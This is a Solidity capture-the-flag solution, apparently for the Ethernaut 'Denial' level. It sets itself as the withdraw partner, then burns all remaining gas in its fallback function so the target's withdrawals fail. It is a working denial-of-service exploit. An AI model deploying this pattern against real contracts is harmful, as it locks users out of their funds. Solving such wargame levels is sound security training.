// SPDX-License-Identifier: none
pragma solidity ^0.8.0;

interface Denial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function contractBalance() external returns (uint);
}

contract Attack {

    Denial denial;

    constructor(address $your_ethernaut_instance_here) {
        denial = Denial($your_ethernaut_instance_here);
    }
    
    function attack() public {
        denial.setWithdrawPartner(address(this));
        denial.withdraw();
    }

    fallback() external payable {
        // eat up all the rest of the gas when Denial sends funds to this addr
        uint i;
        uint start = gasleft();
        while (gasleft() <= start) {
            i++;
        }
    }
}
